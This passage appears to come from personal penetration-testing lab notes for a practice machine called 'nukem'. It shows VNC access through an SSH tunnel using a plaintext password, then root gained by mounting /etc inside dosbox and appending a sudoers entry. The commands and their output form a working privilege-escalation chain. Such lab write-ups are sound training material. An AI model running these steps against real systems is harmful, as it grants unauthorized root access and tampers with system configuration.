/usr/bin/dosbox

However, attempting to run `dosbox` from the command line fails as it requires a graphical interface. Further enumeration reveals a VNC service on port 5901 that could give us GUI access.

```
ps -ef | grep vnc
```

```powershell
[commander@nukem ~]$ ps -ef | grep vnc 
root 367 1 0 01:48 ? 00:00:00 /usr/bin/vncsession commander :1 ...
```

To access the VNC service securely, we’ll forward port 5901 to our machine using SSH.
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `ssh -L 5901:localhost:5901 user@${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
With the tunnel active, we connect using `vncviewer`.
```
vncviewer localhost:5901
```

```powershell
richie@kali:~$ vncviewer localhost:5901 
Password: CommanderKeenVorticons1990
```

On the xfce Desktop, open terminal and open dosbox

```
/usr/bin/dosbox
```

On dosbox

```
mount C /etc
```

```powershell
Z:\> mount C /etc 
Drive C is mounted as local directory /etc/
```

To switch to C:\
```
C:
```

And finally 

```
echo commander ALL=(ALL) ALL >> sudoers
```

This grants `commander` full sudo privileges. Returning to our SSH session, we can now escalate to root using `sudo`.

Back to SSH Session, 
```
sudo -i
```

Root
```powershell
[commander@nukem ~]$ sudo -i 
[sudo] password for commander: CommanderKeenVorticons1990 

[root@nukem ~]# whoami root
```